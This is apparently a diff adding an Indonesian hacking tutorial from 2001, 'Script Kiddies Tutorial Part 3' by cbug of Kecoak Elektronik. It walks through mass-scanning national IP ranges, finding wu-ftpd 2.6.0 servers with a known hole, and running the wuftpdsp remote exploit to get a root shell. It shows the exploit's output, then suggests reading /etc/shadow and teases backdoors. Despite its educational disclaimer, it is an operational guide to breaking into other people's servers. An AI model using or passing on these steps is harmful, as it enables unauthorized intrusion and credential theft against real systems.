@@ -1,0 +1,126 @@
+======================================================================
+Bagaimana Menggunakan (wu-ftpd) Remote Eksploit
+Script Kiddies Tutorial Bagian 3
+oleh: cbug aka CyberBug (Kecoak Elektronik)
+Pertengahan Februari 2001
+======================================================================
+
+Pemberitahuan :
+1. Artikel ini dimaksudkan untuk bahan pelajaran para admin dan siapa
+   saja yang ingin mengembangkan pengetahuan networking/internet mereka.
+2. Kecoak Elektronik tidak bertanggung jawab atas penyalah gunaan artikel
+   ini.
+3. Kecoak Elektronik tetap menyertakan dan tidak menghapus Nama Penulis
+   eksploit/script dengan harapan pembaca juga tetap menyertakan kredit
+   untuk mereka, jangan mengganti nama2 penulis artikel/eksploit/script
+   dengan nama anda dengan harapan nanti dianggap hacker.
+ 
+
+Akhirnya! ... setelah lama menimbang2 saya memutuskan melepas artikel ini 
+demi kejayaan para script kiddies ;P dan supaya script kiddies lainnya 
+tidak merasa bahwa cuma mereka doang yang jagoan ... hehehe.
+
+Nah ... mulai darimana kita? ... mmm ... singkat saja remote exploit 
+adalah program/eksploit yang jika dijalankan dari mesin kamu dengan 
+sasaran server tertentu, akan mengakibatkan anda mendapatkan root shell 
+di mesin/server sasaran yang berarti kamu mempunyai akses root dimesin 
+tsb (asik ya?) ini yang disebut cracking (beberapa kiddie menyebutnya 
+hacking ... tapi bukan itu namanya yg benar cracking ... hehehe) dan yang 
+make eksploit itu disebut script kiddie :P~ 
+BTW ... semua instruksi ini harus dijalankan di mesin linux/*nix.
+
+A. Mass Target Scanning
+Untuk bisa mendapatkan sasaran tentu saja kita harus punya daftar IP yang 
+akan di crack ... ya kan? ... nah daftar IP itu bisa saja berupa kumpulan 
+IP yang kamu sudah tahu atau punya teman2 kamu dan kamu simpan di satu 
+file.
+Tapi untuk mudahnya kita bisa menggunakan program ADMz0ne dari ADM Crew 
+untuk mendapatkan daftar IP yang kita inginkan.
+
+1. Download precompiled binary program z0ne dari site Kecoak
+2. Kalau anda download precompiled jangan lupa : ~$ chmod +x z0ne
+3. Misalnya kamu ingin dapat list IP dari 
+   a. Phillipines (.ph) :
+      nohup ./z0ne -o ph > ph.log &
+   b. Site Commercial di Afrika Selatan
+      nohup ./z0ne -o co.za > co.za.log &
+   c. Dan lain-lain ... coba bereksperimen dengan domain
+   Note : nohup dan & di awal dan akhir perintah adalah untuk 
+   membackground proses scanning, ketik : man nohup kalo ingin tahu
+   lebih banyak.
+4. Untuk contoh ini misalnya anda berhasil mendapatkan list IP dari
+   Phillipines (.ph) dan disimpan di file ph.log
+   Isinya kira2 seperti berikut ini :
+   ~$ cat ph.log
+   210.23.230.195
+   210.23.234.33
+   210.23.234.65
+   210.23.230.193
+   203.167.64.2
+   203.167.64.3
+   ---dst---
+
+B. Scanning server yang mempunyai wufptd hole
+
+1. Download precompiled binary program wu-scan dari site Kecoak
+2. Atau anda bisa download source nya wu-scan.c kemudian compile:
+   gcc -o wu-scan wu-scan.c
+3. Kalau anda download precompiled jangan lupa : ~$ chmod +x wu-scan
+4. Scan IP list yang sudah didapat sebelumnya (ph.log)
+   nohup ./wu-scan ph.log &
+5. Hasil akhirnya akan dituliskan di file wu-scan.log
+   Hasilnya kira2 seperti ini :
+
+   210.23.234.42: wu-2.6.0(1)
+   203.176.29.195: wu-2.6.0(1)
+   208.160.224.133: Vulnerable wu-2.6.0(1) running on RH 6.2
+
+   IP yang bisa di crack adalah yang ada tulisan Vulnerable blah ;)
+   Untuk mudahnya kamu bisa menaruh IP yg vulnerable di satu file lain
+   misalnya ph.vul
+   ~$ cat wu-scan.log | grep Vulnerable > ph.vul
+
+C. Cracking ... let's party!
+
+1. Download precompiled binary program wuftpdsp dari site Kecoak
+2. Atau anda bisa download source nya wuftpdsp.c kemudian compile:
+   gcc -o wuftpdsp wuftpdsp.c
+3. Kalau anda download precompiled jangan lupa : chmod +x wuftpdsp
+4. Untuk me-remote exploit 208.160.224.133 ketik :
+   ./wuftpdsp -s0 -t 208.160.224.133
+
+--- ini yg akan keliatan di layar ---
+Target: 208.160.224.133 (ftp/<shellcode>): RedHat 6.2 (?) with wuftpd 
+2.6.0(1) from rpm
+Return Address: 0x08075844, AddrRetAddr: 0xbfffb028, Shellcode: 152
+
+loggin into system..
+USER ftp
+331 Guest login ok, send your complete e-mail address as password.
+PASS <shellcode>
+230 Guest login ok, access restrictions apply.
+STEP 2 : Skipping, magic number already exists: [87,01:03,02:01,01:02,04]
+STEP 3 : Checking if we can reach our return address by format string
+STEP 4 : Ptr address test: 0xbfffb028 (if it is not 0xbfffb028 ^C me now)
+STEP 5 : Sending code.. this will take about 10 seconds.
+Press ^\ to leave shell
+blah ...
+uid=0(root) gid=0(root) egid=50(ftp) groups=50(ftp)
+--- habis ---
+
+6. Kamu bisa coba beberapa perintah standar seperti ls :P~ di root shell
+   kamu yang baru, atau perintah lain yang agak bermanfaat ;) seperti
+   cat /etc/passwd dan cat /etc/shadow
+7. Dan seperti pesan nya tekan CTRL dan \ kalau ingin keluar dari root 
+   shell (dan kembali ke shell di mesin kamu sendiri.
+8. Selain itu? kan ada trojan/backdoor dll, begitu mungkin kamu bertanya 
+   ehm ... ikuti saja Script Kiddies Tutorial berikutnya dan menjauhlah 
+   dari masalah ... OK?
+
+D. wu-ftpd eksploit lain.
+   Buat yang masih penasaran dengan hasil wuftpdsp, coba gunakan wu-ftpd
+   eksploitnya TESO Team - 7350wu
+   Cara pakainya kamu cari sendiri ... anggap saja PR.
+
+Salam,
+cbug
